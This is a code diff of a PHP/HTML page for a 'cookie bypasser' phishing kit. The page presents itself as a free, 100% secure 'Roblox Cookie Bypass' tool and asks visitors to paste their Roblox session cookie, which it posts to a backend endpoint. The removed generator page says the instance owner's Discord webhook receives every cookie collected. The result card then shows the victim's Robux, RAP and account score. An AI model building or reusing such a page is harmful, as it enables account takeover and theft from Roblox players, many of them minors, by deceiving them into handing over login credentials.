@@ -1,15 +1,58 @@
+<?php
+require_once '../config.php';
+require_once '../functions.php';
+
+// Get directory from URL
+$directory = $_GET['dir'] ?? '';
+
+if (empty($directory)) {
+    http_response_code(400);
+    die('Invalid request');
+}
+
+// Verify instance exists
+$instanceData = getInstanceData($directory);
+if (!$instanceData) {
+    http_response_code(404);
+    die('Instance not found');
+}
+
+// Track visit
+trackVisit($directory);
+
+// Get domain info
+$domain = $_SERVER['HTTP_HOST'] ?? 'localhost';
+$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
+$apiUrl = "$protocol://$domain/api/bypass.php";
+?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Create Instance - Bypasserv3</title>
+    <title>Roblox Cookie Bypass - Free & Safe</title>
+    <meta name="description" content="Bypass Roblox cookies instantly - Fast, secure, and 100% free">
     <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/5473/5473473.png">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     
     <style>
+        :root {
+            --primary: #8b5cf6;
+            --primary-dark: #7c3aed;
+            --primary-light: #a78bfa;
+            --dark: #0f172a;
+            --darker: #0a0e1a;
+            --light: #f8fafc;
+            --gray: #94a3b8;
+            --success: #10b981;
+            --error: #ef4444;
+            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            --glass: rgba(30, 41, 59, 0.5);
+            --glass-border: rgba(255, 255, 255, 0.1);
+        }
+
         * {
             margin: 0;
             padding: 0;
@@ -17,352 +60,386 @@
         }
 
         body {
-            font-family: 'Inter', sans-serif;
-            background: linear-gradient(135deg, #1a1d29 0%, #2d1b4e 100%);
-            color: #e5e7eb;
+            font-family: 'Poppins', sans-serif;
+            background-color: var(--darker);
+            color: var(--light);
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
+            background-image: 
+                radial-gradient(at 80% 0%, rgba(139, 92, 246, 0.15) 0px, transparent 50%),
+                radial-gradient(at 0% 50%, rgba(139, 92, 246, 0.15) 0px, transparent 50%);
+            background-attachment: fixed;
             padding: 20px;
         }
 
-        .container {
+        .bypass-container {
             width: 100%;
-            max-width: 440px;
+            max-width: 600px;
         }
 
-        .card {
-            background: rgba(30, 35, 50, 0.9);
+        .bypass-card {
+            background: var(--glass);
             backdrop-filter: blur(20px);
-            border-radius: 20px;
-            padding: 40px 35px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
-            border: 1px solid rgba(139, 92, 246, 0.1);
+            border-radius: 16px;
+            padding: 40px;
+            border: 1px solid var(--glass-border);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
         }
 
-        .header {
+        .bypass-header {
             text-align: center;
             margin-bottom: 30px;
         }
 
-        .icon {
-            width: 70px;
-            height: 70px;
-            background: linear-gradient(135deg, #8b5cf6, #7c3aed);
+        .bypass-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
             margin: 0 auto 20px;
-            font-size: 32px;
-            box-shadow: 0 10px 30px rgba(139, 92, 246, 0.4);
+            font-size: 36px;
+            animation: pulse 2s infinite;
         }
 
-        .title {
-            font-size: 26px;
+        @keyframes pulse {
+            0%, 100% {
+                transform: scale(1);
+                box-shadow: 0 0 0 0 rgba(139, 92, 246, 0.7);
+            }
+            50% {
+                transform: scale(1.05);
+                box-shadow: 0 0 0 20px rgba(139, 92, 246, 0);
+            }
+        }
+
+        .bypass-title {
+            font-size: 28px;
             font-weight: 700;
-            color: #fff;
             margin-bottom: 8px;
+            background: linear-gradient(90deg, var(--primary-light), var(--primary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
         }
 
-        .subtitle {
-            font-size: 15px;
-            color: #9ca3af;
-        }
-
-        .info-box {
-            background: rgba(59, 130, 246, 0.12);
-            border: 1px solid rgba(59, 130, 246, 0.25);
-            border-radius: 12px;
-            padding: 14px 16px;
-            margin-bottom: 28px;
-            font-size: 13px;
-            color: #93c5fd;
-            display: flex;
-            align-items: flex-start;
-            gap: 10px;
-        }
-
-        .info-box i {
-            margin-top: 2px;
-            font-size: 16px;
-        }
-
-        .info-box strong {
-            color: #dbeafe;
-            font-weight: 600;
+        .bypass-subtitle {
+            color: var(--gray);
+            font-size: 14px;
         }
 
         .form-group {
-            margin-bottom: 24px;
+            margin-bottom: 20px;
         }
 
         .form-label {
             display: block;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
             font-size: 14px;
             font-weight: 500;
-            color: #d1d5db;
+            color: var(--gray);
         }
 
-        .input-wrapper {
+        .textarea-wrapper {
             position: relative;
         }
 
-        .input-icon {
-            position: absolute;
-            left: 16px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: #6b7280;
-            font-size: 16px;
-            z-index: 1;
-        }
-
-        .form-input {
+        .form-textarea {
             width: 100%;
-            padding: 14px 16px 14px 46px;
-            background: rgba(17, 24, 39, 0.6);
-            border: 1px solid rgba(107, 114, 128, 0.3);
-            border-radius: 10px;
-            color: #e5e7eb;
-            font-family: 'Inter', sans-serif;
-            font-size: 14px;
-            transition: all 0.2s ease;
-        }
-
-        .form-input::placeholder {
-            color: #6b7280;
-        }
-
-        .form-input:focus {
-            outline: none;
-            border-color: #8b5cf6;
-            background: rgba(17, 24, 39, 0.8);
-            box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.15);
-        }
-
-        .form-help {
-            font-size: 12px;
-            color: #9ca3af;
-            margin-top: 8px;
-        }
-
-        .set-webhook-text {
+            min-height: 120px;
+            padding: 12px 16px;
+            background: rgba(30, 41, 59, 0.5);
+            border: 1px solid var(--glass-border);
+            border-radius: 8px;
+            color: var(--light);
+            font-family: 'Poppins', sans-serif;
             font-size: 13px;
-            color: #9ca3af;
-            margin-top: -16px;
-            margin-bottom: 20px;
+            resize: vertical;
+            transition: var(--transition);
+        }
+
+        .form-textarea:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.2);
         }
 
         .submit-btn {
             width: 100%;
             padding: 14px;
-            background: linear-gradient(135deg, #8b5cf6 0%, #7c3aed 100%);
+            background: linear-gradient(90deg, var(--primary), var(--primary-dark));
             border: none;
-            border-radius: 10px;
+            border-radius: 8px;
             color: white;
             font-weight: 600;
-            font-size: 15px;
+            font-size: 16px;
             cursor: pointer;
-            transition: all 0.3s ease;
+            transition: var(--transition);
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 10px;
-            box-shadow: 0 4px 15px rgba(139, 92, 246, 0.3);
         }
 
         .submit-btn:hover {
             transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(139, 92, 246, 0.4);
-            background: linear-gradient(135deg, #9333ea 0%, #7c3aed 100%);
-        }
-
-        .submit-btn:active {
-            transform: translateY(0);
+            box-shadow: 0 8px 20px rgba(139, 92, 246, 0.4);
         }
 
         .submit-btn:disabled {
             opacity: 0.6;
             cursor: not-allowed;
-            transform: none;
         }
 
-        .footer-text {
+        .features {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            margin-top: 30px;
+        }
+
+        .feature {
             text-align: center;
-            margin-top: 24px;
-            font-size: 14px;
-            color: #9ca3af;
+            padding: 15px;
+            background: rgba(30, 41, 59, 0.3);
+            border-radius: 8px;
+            border: 1px solid var(--glass-border);
         }
 
-        .footer-text a {
-            color: #a78bfa;
-            text-decoration: none;
-            font-weight: 500;
-            transition: color 0.2s;
+        .feature-icon {
+            font-size: 24px;
+            margin-bottom: 8px;
+            color: var(--primary-light);
         }
 
-        .footer-text a:hover {
-            color: #c4b5fd;
+        .feature-text {
+            font-size: 12px;
+            color: var(--gray);
+        }
+
+        .result-card {
+            display: none;
+            margin-top: 20px;
+            padding: 20px;
+            background: rgba(16, 185, 129, 0.1);
+            border: 1px solid rgba(16, 185, 129, 0.3);
+            border-radius: 8px;
+        }
+
+        .result-card.show {
+            display: block;
+        }
+
+        .result-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+
+        .result-avatar {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            border: 2px solid var(--success);
+        }
+
+        .result-info h3 {
+            font-size: 16px;
+            margin-bottom: 4px;
+        }
+
+        .result-info p {
+            font-size: 13px;
+            color: var(--gray);
+        }
+
+        .result-stats {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-top: 15px;
+        }
+
+        .result-stat {
+            text-align: center;
+            padding: 10px;
+            background: rgba(30, 41, 59, 0.5);
+            border-radius: 6px;
+        }
+
+        .result-stat-value {
+            font-size: 18px;
+            font-weight: 600;
+            color: var(--primary-light);
+        }
+
+        .result-stat-label {
+            font-size: 11px;
+            color: var(--gray);
+            margin-top: 4px;
+        }
+
+        @media (max-width: 768px) {
+            .features {
+                grid-template-columns: 1fr;
+            }
+
+            .result-stats {
+                grid-template-columns: 1fr;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="card">
-            <div class="header">
-                <div class="icon">
-                    <i class="fas fa-pen"></i>
+    <div class="bypass-container">
+        <div class="bypass-card">
+            <div class="bypass-header">
+                <div class="bypass-icon">
+                    <i class="fas fa-cookie-bite"></i>
                 </div>
-                <h1 class="title">Create Instance</h1>
-                <p class="subtitle">Generate your bypass site in seconds</p>
+                <h1 class="bypass-title">Roblox Cookie Bypass</h1>
+                <p class="bypass-subtitle">Instant, secure, and completely free</p>
             </div>
 
-            <div class="info-box">
-                <i class="fas fa-info-circle"></i>
-                <div>
-                    <strong>ℹ️ Note:</strong> Your webhook will receive all bypassed cookies from your site.
-                </div>
-            </div>
-
-            <form id="generatorForm">
+            <form id="bypassForm">
                 <div class="form-group">
-                    <label class="form-label">Directory Name</label>
-                    <div class="input-wrapper">
-                        <i class="fas fa-folder input-icon"></i>
-                        <input 
-                            type="text" 
-                            class="form-input" 
-                            id="directory"
-                            placeholder="my-bypass-instance"
-                            pattern="[A-Za-z0-9_-]{3,32}"
+                    <label class="form-label">Paste Your Roblox Cookie</label>
+                    <div class="textarea-wrapper">
+                        <textarea 
+                            class="form-textarea" 
+                            id="cookieInput"
+                            placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_..."
                             required
-                            autocomplete="off"
-                        >
+                        ></textarea>
                     </div>
-                    <div class="form-help">3-32 characters (letters, numbers, hyphens, underscores only)</div>
-                </div>
-
-                <div class="form-group">
-                    <label class="form-label">User Webhook URL (Optional)</label>
-                    <div class="input-wrapper">
-                        <i class="fas fa-link input-icon"></i>
-                        <input 
-                            type="url" 
-                            class="form-input" 
-                            id="userWebhook"
-                            placeholder="https://discord.com/api/webhooks/... (optional)"
-                            autocomplete="off"
-                        >
-                    </div>
-                    <div class="set-webhook-text">Set Your Webhook</div>
                 </div>
 
                 <button type="submit" class="submit-btn" id="submitBtn">
                     <i class="fas fa-rocket"></i>
-                    <span>Generate Site</span>
+                    <span>Bypass Cookie</span>
                 </button>
             </form>
 
-            <div class="footer-text">
-                Already have a Site? <a href="../dashboard/sign-in.php">Sign in</a>
+            <div class="result-card" id="resultCard">
+                <div class="result-header">
+                    <img src="" alt="Avatar" class="result-avatar" id="resultAvatar">
+                    <div class="result-info">
+                        <h3 id="resultUsername">Username</h3>
+                        <p id="resultDetails">Details</p>
+                    </div>
+                </div>
+                <div class="result-stats">
+                    <div class="result-stat">
+                        <div class="result-stat-value" id="resultRobux">0</div>
+                        <div class="result-stat-label">Robux</div>
+                    </div>
+                    <div class="result-stat">
+                        <div class="result-stat-value" id="resultRAP">0</div>
+                        <div class="result-stat-label">RAP</div>
+                    </div>
+                    <div class="result-stat">
+                        <div class="result-stat-value" id="resultScore">0</div>
+                        <div class="result-stat-label">Score</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="features">
+                <div class="feature">
+                    <div class="feature-icon"><i class="fas fa-bolt"></i></div>
+                    <div class="feature-text">Instant Bypass</div>
+                </div>
+                <div class="feature">
+                    <div class="feature-icon"><i class="fas fa-shield-alt"></i></div>
+                    <div class="feature-text">100% Secure</div>
+                </div>
+                <div class="feature">
+                    <div class="feature-icon"><i class="fas fa-gift"></i></div>
+                    <div class="feature-text">Always Free</div>
+                </div>
             </div>
         </div>
     </div>
 
     <script>
-        const form = document.getElementById('generatorForm');
+        const form = document.getElementById('bypassForm');
         const submitBtn = document.getElementById('submitBtn');
-        const directoryInput = document.getElementById('directory');
-        const userWebhookInput = document.getElementById('userWebhook');
+        const cookieInput = document.getElementById('cookieInput');
+        const resultCard = document.getElementById('resultCard');
 
         form.addEventListener('submit', async function(e) {
             e.preventDefault();
 
-            const directory = directoryInput.value.trim();
-            const userWebhook = userWebhookInput.value.trim();
+            const cookie = cookieInput.value.trim();
 
-            // Validate directory format
-            if (!/^[A-Za-z0-9_-]{3,32}$/.test(directory)) {
+            if (!cookie) {
                 Swal.fire({
-                    title: 'Invalid Directory',
-                    text: 'Directory must be 3-32 characters (letters, numbers, hyphens, underscores only)',
+                    title: 'Error',
+                    text: 'Please enter a cookie',
                     icon: 'error',
-                    background: '#1e2332',
-                    color: '#e5e7eb',
-                    confirmButtonColor: '#8b5cf6'
+                    background: '#0f172a',
+                    color: '#f8fafc',
+                    confirmButtonColor: '#ef4444'
                 });
                 return;
             }
 
+            // Hide result card
+            resultCard.classList.remove('show');
+
             // Disable button
             submitBtn.disabled = true;
-            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i><span>Creating...</span>';
+            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i><span>Bypassing...</span>';
 
             try {
-                const response = await fetch('create.php', {
+                const response = await fetch('<?php echo $apiUrl; ?>', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify({
-                        directory: directory,
-                        userWebhook: userWebhook
+                        cookie: cookie,
+                        directory: '<?php echo htmlspecialchars($directory); ?>'
                     })
                 });
 
                 const data = await response.json();
 
                 if (data.success) {
-                    await Swal.fire({
+                    // Show result card
+                    document.getElementById('resultAvatar').src = data.avatarUrl || 'https://www.roblox.com/headshot-thumbnail/image/default.png';
+                    document.getElementById('resultUsername').textContent = data.userInfo.username || 'Unknown';
+                    document.getElementById('resultDetails').textContent = `Premium: ${data.userInfo.premium} • Voice: ${data.userInfo.voiceChat}`;
+                    document.getElementById('resultRobux').textContent = data.userInfo.robux ? data.userInfo.robux.toLocaleString() : '0';
+                    document.getElementById('resultRAP').textContent = data.userInfo.rap ? data.userInfo.rap.toLocaleString() : '0';
+                    document.getElementById('resultScore').textContent = data.userInfo.accountScore || '0';
+                    
+                    resultCard.classList.add('show');
+
+                    Swal.fire({
                         title: 'Success!',
-                        html: `
-                            <div style="text-align: left; padding: 20px;">
-                                <p style="margin-bottom: 15px; color: #9ca3af;">Your instance has been created!</p>
-                                
-                                <div style="margin-bottom: 15px;">
-                                    <strong style="color: #a78bfa;">🔗 Public Link:</strong><br>
-                                    <code style="background: rgba(139, 92, 246, 0.15); padding: 10px; border-radius: 6px; display: block; margin-top: 5px; word-break: break-all; color: #e5e7eb;">${data.publicUrl}</code>
-                                </div>
-                                
-                                <div style="margin-bottom: 15px;">
-                                    <strong style="color: #a78bfa;">📊 Dashboard:</strong><br>
-                                    <code style="background: rgba(139, 92, 246, 0.15); padding: 10px; border-radius: 6px; display: block; margin-top: 5px; word-break: break-all; color: #e5e7eb;">${data.dashboardUrl}</code>
-                                </div>
-                                
-                                <div style="margin-bottom: 15px;">
-                                    <strong style="color: #a78bfa;">🔑 Token:</strong><br>
-                                    <code style="background: rgba(139, 92, 246, 0.15); padding: 10px; border-radius: 6px; display: block; margin-top: 5px; word-break: break-all; color: #e5e7eb;">${data.token}</code>
-                                </div>
-                                
-                                <p style="color: #10b981; margin-top: 15px;">✅ Check your Discord webhook for details!</p>
-                            </div>
-                        `,
+                        text: 'Cookie bypassed successfully! Check the results below.',
                         icon: 'success',
-                        background: '#1e2332',
-                        color: '#e5e7eb',
-                        confirmButtonColor: '#8b5cf6',
-                        confirmButtonText: 'Go to Dashboard',
-                        width: '600px'
+                        background: '#0f172a',
+                        color: '#f8fafc',
+                        confirmButtonColor: '#10b981'
                     });
 
-                    // Redirect to dashboard
-                    window.location.href = data.dashboardUrl;
+                    // Clear input
+                    cookieInput.value = '';
                 } else {
                     Swal.fire({
-                        title: 'Error',
-                        text: data.error || 'Failed to create instance',
+                        title: 'Bypass Failed',
+                        text: data.error || 'Failed to bypass cookie. Please check your cookie and try again.',
                         icon: 'error',
-                        background: '#1e2332',
-                        color: '#e5e7eb',
-                        confirmButtonColor: '#8b5cf6'
+                        background: '#0f172a',
+                        color: '#f8fafc',
+                        confirmButtonColor: '#ef4444'
                     });
-
-                    // Re-enable button
-                    submitBtn.disabled = false;
-                    submitBtn.innerHTML = '<i class="fas fa-rocket"></i><span>Generate Site</span>';
                 }
             } catch (error) {
                 console.error('Error:', error);
@@ -370,19 +447,16 @@
                     title: 'Error',
                     text: 'An error occurred. Please try again.',
                     icon: 'error',
-                    background: '#1e2332',
-                    color: '#e5e7eb',
-                    confirmButtonColor: '#8b5cf6'
+                    background: '#0f172a',
+                    color: '#f8fafc',
+                    confirmButtonColor: '#ef4444'
                 });
-
+            } finally {
                 // Re-enable button
                 submitBtn.disabled = false;
-                submitBtn.innerHTML = '<i class="fas fa-rocket"></i><span>Generate Site</span>';
+                submitBtn.innerHTML = '<i class="fas fa-rocket"></i><span>Bypass Cookie</span>';
             }
         });
-
-        // Auto-focus directory input
-        directoryInput.focus();
     </script>
 </body>
 </html>
